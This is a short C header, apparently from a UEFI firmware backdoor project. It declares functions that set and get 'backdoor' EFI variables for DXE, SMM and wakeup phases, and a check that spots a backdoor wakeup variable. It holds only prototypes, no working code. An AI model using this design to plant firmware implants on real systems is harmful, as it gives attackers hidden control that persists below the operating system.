#ifndef __EFIVARS_H__
#define __EFIVARS_H__

enum BackdoorEfiVar {
    DxeVar,
    SmmVar,
    WakeupVar
};

EFI_STATUS set_backdoor_efivar(enum BackdoorEfiVar, void* data, UINTN len);
EFI_STATUS get_backdoor_efivar(enum BackdoorEfiVar, void* data, UINTN len);

EFI_STATUS set_backdoor_efivar_str(enum BackdoorEfiVar, const char* msg);

BOOLEAN is_backdoor_wakeup_var(CHAR16* name, EFI_GUID* guid);

BOOLEAN memcmp(void* data1, void* data2, UINT32 size);

#endif
